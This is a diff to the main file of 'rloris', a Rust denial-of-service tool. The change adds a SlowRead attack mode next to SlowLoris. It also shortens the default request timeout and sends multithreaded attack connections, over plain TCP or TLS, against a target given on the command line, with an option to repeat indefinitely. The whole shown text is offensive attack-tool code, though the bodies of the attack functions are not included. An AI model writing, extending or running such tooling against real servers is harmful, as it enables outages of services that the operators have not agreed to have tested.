@@ -12,11 +12,15 @@ use openssl::ssl::{SslMethod, SslConnectorBuilder};
 mod slowloris_attack;
 use slowloris_attack::slowloris_attack;
 
+mod slowread_attack;
+use slowread_attack::slowread_attack;
+
 const USAGE: &'static str = "
 rloris - SlowLoris and other Slow HTTP DoSes in Rust
 
 Usage:
-    rloris <target> [--ssl] [--port=<port>] [--timeout=<timeout>] [--cycles=<cycles>] [--domain=<domain>] [--nofinalize] [--repeat] [--threads=<threads>] [--post]
+    rloris (loris) <target> [--ssl] [--port=<port>] [--timeout=<timeout>] [--cycles=<cycles>] [--domain=<domain>] [--nofinalize] [--repeat] [--threads=<threads>] [--post]
+    rloris (read) <target> [--ssl] [--port=<port>] [--timeout=<timeout>] [--domain=<domain>] [--repeat] [--threads=<threads>]
     rloris (-h | --help)
 
 Options:
@@ -24,7 +28,7 @@ Options:
     --post          Use POST rather than GET as the default HTTP verb.
     --ssl           Use SSL. Changes default port to 443.
     --port=P        Use port P. Defaults to 80 for plaintext, 443 for SSL.
-    --timeout=T     Total time for a single request, in milliseconds. [default: 10000]
+    --timeout=T     Total time for a single request, in milliseconds. [default: 1000]
     --cycles=C      Total number of additional \"keepalive\" headers to be sent. [default: 10]
     --domain=D      Override the domain name for SSL connections (e.g., if you're connecting to a raw IP address)
     --repeat        Perform the attack repeatedly (WARNING - Can produce a DoS condition!)
@@ -42,7 +46,9 @@ struct Args {
     flag_domain: Option<String>,
     flag_repeat: bool,
     flag_threads: usize,
-    flag_post: bool
+    flag_post: bool,
+    cmd_loris: bool,
+    cmd_read: bool
 }
 
 #[derive(Debug, Clone)]
@@ -88,6 +94,8 @@ fn main() {
     let threads = args.flag_threads;
     let ssl = args.flag_ssl;
     let post = args.flag_post;
+    let cmd_loris = args.cmd_loris;
+    let cmd_read = args.cmd_read;
     // Extract targetting information
     let mut target = Target::new(args.arg_target, port);
 
@@ -97,8 +105,11 @@ fn main() {
     }
 
     loop {
-        println!("Beginning SlowLoris against target {} with {} threads.", target.get_designator(), threads);
-        println!("\tThis is expected to take {} seconds.", timeout as f32/1000.0);
+        if cmd_loris {
+            println!("Beginning SlowLoris against target {} with {} threads.", target.get_designator(), threads);
+        } else if cmd_read {
+            println!("Beginning SlowRead against target {} with {} threads.", target.get_designator(), threads);
+        }
         let mut handles = Vec::with_capacity(threads);
         for threadn in 0..threads {
             let target = target.clone();
@@ -119,9 +130,17 @@ fn main() {
                         let mut ssl_stream = connector.connect(target.get_domain(), tcp_stream)
                             .unwrap_or_else(|e| {error!("[CONTROL:{}] !!! Couldn't connect TLS. {}\nDid you provide a domain name, not an IP?", threadn, e); panic!();});
                         info!("[CONTROL:{}] Successfully connected with TLS.", threadn);
-                        slowloris_attack(&mut ssl_stream, timeout, cycles, finalize, post, threadn);
+                        if cmd_loris {
+                            slowloris_attack(&mut ssl_stream, timeout, cycles, finalize, post, threadn);
+                        } else if cmd_read {
+                            slowread_attack(&mut ssl_stream, timeout, threadn);
+                        }
                     } else {
-                        slowloris_attack(&mut tcp_stream, timeout, cycles, finalize, post, threadn);
+                        if cmd_loris {
+                            slowloris_attack(&mut tcp_stream, timeout, cycles, finalize, post, threadn);
+                        } else if cmd_read {
+                            slowread_attack(&mut tcp_stream, timeout, threadn);
+                        }
                     }
                 })
             );
